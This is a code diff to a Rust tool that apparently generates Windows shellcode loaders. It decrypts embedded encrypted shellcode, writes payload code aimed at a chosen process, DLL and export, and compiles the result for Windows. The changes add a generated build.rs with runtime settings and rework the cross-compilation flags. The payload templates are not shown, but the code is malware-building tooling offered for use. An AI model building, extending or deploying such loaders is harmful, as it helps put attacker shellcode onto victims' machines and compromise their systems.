@@ -52,11 +52,13 @@ fn main() {
     let project_name = args.output.split(".").next().unwrap();
 
     let mut file = create_project(project_name, dll);
+    let mut build_rs = create_build_file(project_name);
 
 
     let libraries = my_lib::libraries();
     let decrypt = my_lib::shellcode_decrypt(encrypted_shellcode.0, encrypted_shellcode.1, encrypted_shellcode.2);
     let code = my_lib::payload_main(args.process, args.dll, args.export);
+    let vcruntime = my_lib::vcruntime();
 
     file.write(libraries.as_bytes()).expect("Error writing to main.rs");
     if dll{
@@ -66,11 +68,11 @@ fn main() {
     file.write(code.as_bytes()).expect("Error writing to main.rs");
     file.write(decrypt.as_bytes()).expect("Error writing to main.rs");
 
+    build_rs.write(vcruntime.as_bytes()).expect("Error writing to build.rs");
+
 
    build_file(project_name);
    cleanup(project_name, &args.output);
-   
-
 }
 
 fn build_file(project_name: &str){
@@ -78,8 +80,13 @@ fn build_file(project_name: &str){
     let original_path = env::current_dir().unwrap();
     let project_path = original_path.join(project_name);
     env::set_current_dir(&project_path).expect("Failed to change directory to Rust project");
-    let mut args = vec!["build", "--release", "--quiet"];
-    if cfg!(target_os = "linux"){
+    let mut args = vec!["build"];
+    if cfg!(target_os = "windows"){
+        args.push("--release");
+        args.push("--quiet");
+    }else{
+        args.push("--release");
+        args.push("--quiet");
         args.push("--target");
         args.push("x86_64-pc-windows-gnu");
     }
@@ -161,6 +168,7 @@ fn create_project(project_name: &str, dll: bool) -> File{
     let dependencies = my_lib::dependencies();
     cargo_toml.write(dependencies.as_bytes()).expect("Error writing to Cargo.toml");
 
+
     if dll{
         let cdylib = my_lib::cdylib();
         cargo_toml.write(cdylib.as_bytes()).expect("Error writing to Cargo.toml");
@@ -170,5 +178,11 @@ fn create_project(project_name: &str, dll: bool) -> File{
         File::create(format!("{}/src/main.rs", project_name)).expect("Failed to open main.rs")
     }
 
+
+}
+
+fn create_build_file(project_name: &str) -> File{
+    let mut build_file = File::create(format!("{}/build.rs", project_name)).expect("Failed to create build.rs");
+    build_file
 
 }
